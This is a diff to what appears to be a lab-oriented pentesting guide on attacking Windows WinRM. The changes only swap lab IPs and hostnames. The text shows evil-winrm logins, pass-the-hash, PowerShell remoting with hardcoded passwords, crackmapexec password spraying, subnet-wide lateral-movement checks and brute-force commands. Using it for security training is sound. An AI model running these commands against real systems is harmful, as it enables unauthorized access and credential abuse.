@@ -143,7 +143,7 @@ Config
 ### Service scan
 
 ```shell
-sudo nmap 10.129.14.128 -sV -p5985,5986
+sudo nmap 10.0.14.128 -sV -p5985,5986
 ```
 
 ```
@@ -157,7 +157,7 @@ The version banner is `Microsoft HTTPAPI httpd 2.0` - that's the kernel-mode HTT
 NSE script for HTTPS endpoint inspection:
 
 ```shell
-nmap -p5986 --script ssl-cert,ssl-enum-ciphers 10.129.14.128
+nmap -p5986 --script ssl-cert,ssl-enum-ciphers 10.0.14.128
 ```
 
 This dumps the cert subject (often reveals the hostname) and the TLS cipher policy.
@@ -167,7 +167,7 @@ This dumps the cert subject (often reveals the hostname) and the TLS cipher poli
 If you have a Windows attack host:
 
 ```powershell
-Test-WsMan -ComputerName 10.129.14.128
+Test-WsMan -ComputerName 10.0.14.128
 ```
 
 Successful response:
@@ -204,17 +204,17 @@ Listener
     Enabled = true
     URLPrefix = wsman
     CertificateThumbprint
-    ListeningOn = 10.129.14.128, 127.0.0.1, ::1, fe80::e8a1:...
+    ListeningOn = 10.0.14.128, 127.0.0.1, ::1, fe80::e8a1:...
 
 Listener
     Address = *
     Transport = HTTPS
     Port = 5986
-    Hostname = WIN-DC01.inlanefreight.htb
+    Hostname = WIN-DC01.example.local
     Enabled = true
     URLPrefix = wsman
     CertificateThumbprint = 1234567890ABCDEF...
-    ListeningOn = 10.129.14.128, 127.0.0.1, ::1, fe80::e8a1:...
+    ListeningOn = 10.0.14.128, 127.0.0.1, ::1, fe80::e8a1:...
 ```
 
 Useful for understanding why a probe might be failing - if the HTTPS listener binds only to a specific hostname, IP-based connection attempts get rejected at the listener layer.
@@ -224,7 +224,7 @@ Useful for understanding why a probe might be failing - if the HTTPS listener bi
 The defining WinRM tool. From a Linux attack box:
 
 ```shell
-evil-winrm -i 10.129.14.128 -u Administrator -p 'P4ssw0rd!'
+evil-winrm -i 10.0.14.128 -u Administrator -p 'P4ssw0rd!'
 ```
 
 ```
@@ -259,7 +259,7 @@ Common operator workflow inside evil-winrm:
 ### Pass-the-hash with evil-winrm
 
 ```shell
-evil-winrm -i 10.129.14.128 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
+evil-winrm -i 10.0.14.128 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
 ```
 
 Pass the NTLM hash directly with `-H`. No password needed. Works because WinRM's NTLM auth path doesn't actually need the plaintext password - the hash is what's used to compute the challenge response anyway.
@@ -267,7 +267,7 @@ Pass the NTLM hash directly with `-H`. No password needed. Works because WinRM's
 ### HTTPS connection
 
 ```shell
-evil-winrm -i 10.129.14.128 -u Administrator -p '<pass>' -S -P 5986
+evil-winrm -i 10.0.14.128 -u Administrator -p '<pass>' -S -P 5986
 ```
 
 `-S` enables SSL (HTTPS, port 5986 by default but `-P` overrides). Use this when port 5985 is firewalled - port 5986 is often allowed in environments that have hardened against WinRM-over-HTTP.
@@ -278,40 +278,40 @@ From a Windows attack box (or `pwsh` on Linux):
 
 ```powershell
 $cred = Get-Credential                     # prompts for username + password
-Enter-PSSession -ComputerName 10.129.14.128 -Credential $cred
+Enter-PSSession -ComputerName 10.0.14.128 -Credential $cred
 
 # Or with an explicit credential object
 $pw  = ConvertTo-SecureString 'P4ssw0rd!' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('Administrator', $pw)
-Enter-PSSession -ComputerName 10.129.14.128 -Credential $cred
+Enter-PSSession -ComputerName 10.0.14.128 -Credential $cred
 
 # Run one command instead of entering a session
-Invoke-Command -ComputerName 10.129.14.128 -Credential $cred -ScriptBlock { whoami }
+Invoke-Command -ComputerName 10.0.14.128 -Credential $cred -ScriptBlock { whoami }
 ```
 
 For non-domain-joined client, you'll need to set TrustedHosts first:
 
 ```powershell
-Set-Item WSMan:\localhost\Client\TrustedHosts -Value '10.129.14.128' -Force
+Set-Item WSMan:\localhost\Client\TrustedHosts -Value '10.0.14.128' -Force
 ```
 
 ### crackmapexec / netexec
 
 ```shell
 # Test single credential
-crackmapexec winrm 10.129.14.128 -u Administrator -p 'P4ssw0rd!'
+crackmapexec winrm 10.0.14.128 -u Administrator -p 'P4ssw0rd!'
 
 # Pass-the-hash test
-crackmapexec winrm 10.129.14.128 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
+crackmapexec winrm 10.0.14.128 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
 
 # Spray across many users with one password
-crackmapexec winrm 10.129.14.128 -u users.txt -p 'Spring2024!'
+crackmapexec winrm 10.0.14.128 -u users.txt -p 'Spring2024!'
 
 # Spray across many hosts with one credential (lateral movement check)
 crackmapexec winrm 10.0.0.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
 
 # Execute a command without an interactive shell
-crackmapexec winrm 10.129.14.128 -u Administrator -p '<pass>' -x 'whoami'
+crackmapexec winrm 10.0.14.128 -u Administrator -p '<pass>' -x 'whoami'
 ```
 
 The subnet form is the lateral-movement scan - for each cred you have, instantly map which other hosts in the network it works on.
@@ -319,13 +319,13 @@ The subnet form is the lateral-movement scan - for each cred you have, instantly
 ### Brute-force
 
 ```shell
-crackmapexec winrm 10.129.14.128 -u users.txt -p passwords.txt
+crackmapexec winrm 10.0.14.128 -u users.txt -p passwords.txt
 ```
 
 Or Hydra (less commonly used for WinRM but works):
 
 ```shell
-hydra -L users.txt -P passwords.txt -m 'http-post-form-multipart' 10.129.14.128:5985
+hydra -L users.txt -P passwords.txt -m 'http-post-form-multipart' 10.0.14.128:5985
 ```
 
 Most WinRM brute-force happens via `crackmapexec winrm` - purpose-built, faster, and the output is easier to parse.
